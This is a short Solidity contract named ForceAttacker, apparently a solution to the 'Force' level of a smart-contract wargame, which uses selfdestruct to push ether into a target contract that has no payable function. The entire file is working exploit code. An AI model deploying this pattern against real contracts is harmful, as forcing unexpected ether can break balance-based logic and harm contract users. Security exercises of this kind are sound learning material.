// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "./Force.sol";

contract ForceAttacker {
    Force target;

    constructor(address _target) payable {
        target = Force(_target);
    }

    function attack () public {
        selfdestruct(payable(address(target)));
    }

    receive() external payable{}

}